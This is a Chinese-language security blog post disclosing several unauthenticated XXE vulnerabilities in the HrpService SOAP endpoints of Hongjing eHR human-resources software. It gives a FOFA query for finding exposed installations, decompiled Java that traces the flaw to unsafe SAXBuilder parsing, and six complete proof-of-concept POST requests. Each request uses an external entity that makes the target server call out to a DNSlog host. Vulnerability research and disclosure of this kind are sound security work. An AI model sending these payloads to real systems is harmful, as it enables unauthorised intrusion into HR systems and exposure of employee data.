---
title: "宏景人力资源管理系统 HrpService 多处XXE漏洞"
source: https://mrxn.net/jswz/hjsoft-services-HrpServices-XXE.html
asset_dir: assets/宏景人力资源管理系统-hrpservice-多处xxe漏洞
---

# 宏景人力资源管理系统 HrpService 多处XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/22 08:19
* 1170浏览
* [0评论](#comment)
* 1小时阅读

深入探索

人力资源管理系统

SQL

sql


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

宏景人力资源管理系统（eHR）是一款由宏景软件研发的系统。宏景人力资源管理系统的 `HrpService` 接口处存在[XXE漏洞](https://mrxn.net/tag/XXE)，未经过身份认证的远程攻击者可利用此漏洞获取系统敏感信息。

# 影响版本

# fofa语法

> ```
> app="HJSOFT-HCM"
> ```

# 漏洞分析

深入探索

SQL注入检测工具

编程语言教程

技术文章订阅

关于路由的分析以及两个路由请求触发方式，参考这篇文章：[宏景eHR HrChangeInfoService SQL注入漏洞+XXE漏洞](https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html)

因此我们直接去 `WEB-INF/classes/META-INF/xfire/services.xml` 查找我们本次审计的主角 `HrpService` 部分的定义：

```
<service xmlns="http://xfire.codehaus.org/config/1.0">
    <name>HrpService</name>
    <namespace>http://www.hjsj.com/HrpService</namespace>
    <serviceClass>com.hjsj.hrms.service.HrpIssuanceService</serviceClass>
  </service>
  <service xmlns="http://xfire.codehaus.org/config/1.0">
    <name>HrpServices</name>
    <namespace>http://www.hjsj.com/HrpServices</namespace>
    <serviceClass>com.hjsj.hrms.service.HrpIssuanceService</serviceClass>
  </service>
```

深入探索

漏洞修复方案

网络安全课程

网络安全会议

可以看到两个service均由同一个类处理，因此测试时可以有两种url方式 `/services/HrpServices` 和 `/services/HrpService`

## impInfoByNotice

```
public String impInfoByNotice(String var1) {
        String var2 = "2";
        Connection var3 = null;
        HrIssuanceInterf var4 = new HrIssuanceInterf();

        try {
            var3 = AdminDb.getConnection();
            if (var3 != null) {
                var2 = var4.impInfoByMidtable(var1, var3);
```

跟进 `impInfoByMidtable`

```
public String impInfoByMidtable(String var1, Connection var2) {
        String var3 = "2";

        try {
            LazyDynaBean var4 = this.getParamBean(var1);
            DataImportBo var5 = new DataImportBo(var2);
```

跟进 `getParamBean`

```
private LazyDynaBean getParamBean(String var1) throws GeneralException {
        LazyDynaBean var2 = new LazyDynaBean();

        try {
            byte[] var3 = var1.getBytes();
            ByteArrayInputStream var4 = new ByteArrayInputStream(var3);
            SAXBuilder var5 = new SAXBuilder();
            Document var6 = var5.build(var4);
            Object var7 = null;
```

最终初始的 `var1` 参数被直接带入 `getParamBean` 中使用 `SAXBuilder` 进行解析造成[XXE漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

## getHolidayMsg

[![宏景人力资源管理系统 HrpService 多处XXE漏洞](images/img-001-d9bbc3171e05.webp)](https://image.mrxn.net/fdb1febffc6645b1b34d4cbf6abbb9bb.webp)

## Huayu\_peWageRecv

[![宏景人力资源管理系统 HrpService 多处XXE漏洞](images/img-002-bce325604ef5.webp)](https://image.mrxn.net/a86aa421bb8649fbb2f3a03cbbd49191.webp)

## getRemainHolidays

[![宏景人力资源管理系统 HrpService 多处XXE漏洞](images/img-003-5f8e4e33c2da.webp)](https://image.mrxn.net/a446d0a24b984789992066b790955b13.webp)

## syncHolidayMsg

[![宏景人力资源管理系统 HrpService 多处XXE漏洞](images/img-004-d907150ba643.webp)](https://image.mrxn.net/a157907c3ef84426b59cc1c090642a88.webp)

## updateHolidays

[![宏景人力资源管理系统 HrpService 多处XXE漏洞](images/img-005-954cd045e716.webp)](https://image.mrxn.net/789a33e54e61407b9e2994d7863251a5.webp)

# 漏洞复现

## impInfoByNotice

```
POST /services/HrpService HTTP/1.1
Host: hjsoft.mrxn.net
SOAPAction: ""
Content-Type: text/xml;charset=UTF-8

<!DOCTYPE syscode SYSTEM "http://xxe.test.dnslog.pt/impInfoByNotice">
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrp:impInfoByNotice>
         <hrp:in0><syscode>&send;</syscode></hrp:in0>
      </hrp:impInfoByNotice>
   </soapenv:Body>
</soapenv:Envelope>
```

[![宏景人力资源管理系统 HrpService 多处XXE漏洞](images/img-006-a157f9df6406.webp)](https://image.mrxn.net/25673aa388c34f6e847188684357185c.webp)

DNSLOG 平台成功收到DNS和HTTP请求

## getHolidayMsg

```
POST /services/HrpServices HTTP/1.1
Host: hjsoft.mrxn.net
SOAPAction: ""
Content-Type: text/xml;charset=UTF-8

<!DOCTYPE syscode SYSTEM "http://xxe.test.dnslog.pt/getHolidayMsg">
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrp:getHolidayMsg>
         <hrp:in0>ORs1P9DMem9byoEeSArcK+T60iqKxo6h2M7ONzAhR7w=</hrp:in0>
         <hrp:in1>cni23</hrp:in1>
         <hrp:in2><syscode>&send;</syscode></hrp:in2>
      </hrp:getHolidayMsg>
   </soapenv:Body>
</soapenv:Envelope>
```

[![宏景人力资源管理系统 HrpService 多处XXE漏洞](images/img-007-dfcfb8f00af8.webp)](https://image.mrxn.net/699b5ff8bd724e3d8e09ce2cf22ace4f.webp)

## Huayu\_peWageRecv

```
POST /services/HrpServices HTTP/1.1
Host: hjsoft.mrxn.net
SOAPAction: ""
Content-Type: text/xml;charset=UTF-8

<!DOCTYPE syscode SYSTEM "http://xxe.test.dnslog.pt/Huayu_peWageRecv">
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrp:Huayu_peWageRecv>
         <hrp:in0><syscode>&send;</syscode></hrp:in0>
      </hrp:Huayu_peWageRecv>
   </soapenv:Body>
</soapenv:Envelope>
```

[![宏景人力资源管理系统 HrpService 多处XXE漏洞](images/img-008-54dddd22e158.webp)](https://image.mrxn.net/8c9852f148964a8b92b2f9c4e643b7a7.webp)

## getRemainHolidays

```
POST /services/HrpServices HTTP/1.1
Host: hjsoft.mrxn.net
SOAPAction: ""
Content-Type: text/xml;charset=UTF-8

<!DOCTYPE syscode SYSTEM "http://xxe.test.dnslog.pt/getRemainHolidays">
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrp:getRemainHolidays>
         <hrp:in0>ORs1P9DMem9byoEeSArcK+T60iqKxo6h2M7ONzAhR7w=</hrp:in0>
         <hrp:in1>cni23</hrp:in1>
         <hrp:in2><syscode>&send;</syscode></hrp:in2>
      </hrp:getRemainHolidays>
   </soapenv:Body>
</soapenv:Envelope>
```

[![宏景人力资源管理系统 HrpService 多处XXE漏洞](images/img-009-f0ccba9630ea.webp)](https://image.mrxn.net/1a4d4f0d1fbe4cb3ae850a2e47661bd5.webp)

## syncHolidayMsg

```
POST /services/HrpServices HTTP/1.1
Host: hjsoft.mrxn.net
SOAPAction: ""
Content-Type: text/xml;charset=UTF-8

<!DOCTYPE syscode SYSTEM "http://xxe.test.dnslog.pt/syncHolidayMsg">
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrp:syncHolidayMsg>
         <hrp:in0>ORs1P9DMem9byoEeSArcK+T60iqKxo6h2M7ONzAhR7w=</hrp:in0>
         <hrp:in1>cni23</hrp:in1>
         <hrp:in2><syscode>&send;</syscode></hrp:in2>
      </hrp:syncHolidayMsg>
   </soapenv:Body>
</soapenv:Envelope>
```

[![宏景人力资源管理系统 HrpService 多处XXE漏洞](images/img-010-101ccde49f22.webp)](https://image.mrxn.net/ea9bbd21d79849e999d969b75c1683c8.webp)

## updateHolidays

```
POST /services/HrpServices HTTP/1.1
Host: hjsoft.mrxn.net
SOAPAction: ""
Content-Type: text/xml;charset=UTF-8

<!DOCTYPE syscode SYSTEM "http://xxe.test.dnslog.pt/updateHolidays">
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrp:updateHolidays>
         <hrp:in0>ORs1P9DMem9byoEeSArcK+T60iqKxo6h2M7ONzAhR7w=</hrp:in0>
         <hrp:in1>cni23</hrp:in1>
         <hrp:in2><syscode>&send;</syscode></hrp:in2>
      </hrp:updateHolidays>
   </soapenv:Body>
</soapenv:Envelope>
```

[![宏景人力资源管理系统 HrpService 多处XXE漏洞](images/img-011-54174daae9ee.webp)](https://image.mrxn.net/57d9469081eb41d6824216aa57095aa4.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#XXE](https://mrxn.net/tag/XXE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.impInfoByNotice](#toc-4-1-)
* [4.2.getHolidayMsg](#toc-4-2-)
* [4.3.Huayu\_peWageRecv](#toc-4-3-)
* [4.4.getRemainHolidays](#toc-4-4-)
* [4.5.syncHolidayMsg](#toc-4-5-)
* [4.6.updateHolidays](#toc-4-6-)
* [5.漏洞复现](#toc-5-)
* [5.1.impInfoByNotice](#toc-5-1-)
* [5.2.getHolidayMsg](#toc-5-2-)
* [5.3.Huayu\_peWageRecv](#toc-5-3-)
* [5.4.getRemainHolidays](#toc-5-4-)
* [5.5.syncHolidayMsg](#toc-5-5-)
* [5.6.updateHolidays](#toc-5-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[宏景人力资源管理系统 HrpService 多处XXE漏洞](https://mrxn.net/jswz/hjsoft-services-HrpServices-XXE.html)  
文章链接：<https://mrxn.net/jswz/hjsoft-services-HrpServices-XXE.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hjsoft-services-HrpServices-XXE.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

